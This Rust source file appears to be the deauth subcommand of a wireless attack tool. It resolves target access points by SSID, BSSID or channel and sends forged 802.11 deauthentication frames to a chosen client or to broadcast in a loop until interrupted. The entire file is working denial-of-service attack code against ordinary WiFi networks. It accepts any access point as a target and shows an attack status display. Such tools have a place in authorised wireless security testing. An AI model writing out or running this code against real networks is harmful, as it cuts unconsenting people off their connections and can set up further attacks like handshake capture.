//! wifi deauth: resolve target APs and deauth their clients until Ctrl-C.

use std::sync::atomic::Ordering;
use std::time::{Duration, Instant};

use anyhow::{Result, bail};
use infishark::{Device, ieee80211};

use crate::signals::{RUNNING, install_sigint};
use crate::target::resolve_targets;
use crate::ui;

pub struct DeauthOpts {
    pub ssid: Option<String>,
    pub bssid: Option<String>,
    pub channel: Option<u8>,
    pub client: Option<String>,
    pub reason: u16,
    pub interval_ms: u64,
}

pub fn run(dev: &mut Device, opts: &DeauthOpts, oui_db: Option<&str>) -> Result<()> {
    let client = match &opts.client {
        Some(c) => ieee80211::parse_mac(c)?,
        None => ieee80211::BROADCAST,
    };
    let targets = resolve_targets(
        dev,
        opts.ssid.as_deref(),
        opts.bssid.as_deref(),
        opts.channel,
        oui_db,
        |_| true, // deauth applies to any AP
    )?;
    if targets.is_empty() {
        bail!("no matching networks");
    }
    let frames: Vec<(Vec<u8>, u8)> = targets
        .iter()
        .map(|t| {
            (
                ieee80211::deauth(t.bssid, client, opts.reason).to_bytes(),
                t.channel,
            )
        })
        .collect();
    let summary = targets
        .iter()
        .map(|t| format!("{} \u{b7}{}", t.label, t.channel))
        .collect::<Vec<_>>()
        .join("  ");

    println!("deauthing {} target(s)", targets.len());
    let mut status = ui::StatusBlock::new();
    install_sigint();
    let start = Instant::now();
    let (mut sent, mut failed) = (0u64, 0u64);
    let mut last_draw = Instant::now();

    while RUNNING.load(Ordering::SeqCst) {
        for (frame, channel) in &frames {
            if !RUNNING.load(Ordering::SeqCst) {
                break;
            }
            match dev.wifi_raw_tx(frame, *channel) {
                Ok(true) => sent += 1,
                Ok(false) => failed += 1,
                Err(e) => {
                    status.clear();
                    dev.stop_current_task().ok();
                    return Err(e.into());
                }
            }
        }
        if last_draw.elapsed() >= Duration::from_millis(200) {
            status.draw(&ui::attack_status_lines(
                "deauth",
                &summary,
                sent,
                failed,
                start.elapsed(),
            ));
            last_draw = Instant::now();
        }
        if opts.interval_ms > 0 {
            std::thread::sleep(Duration::from_millis(opts.interval_ms));
        }
    }

    dev.stop_current_task()?;
    status.clear();
    println!(
        "stopped: {sent} sent, {failed} failed in {}",
        ui::fmt_elapsed(start.elapsed())
    );
    Ok(())
}
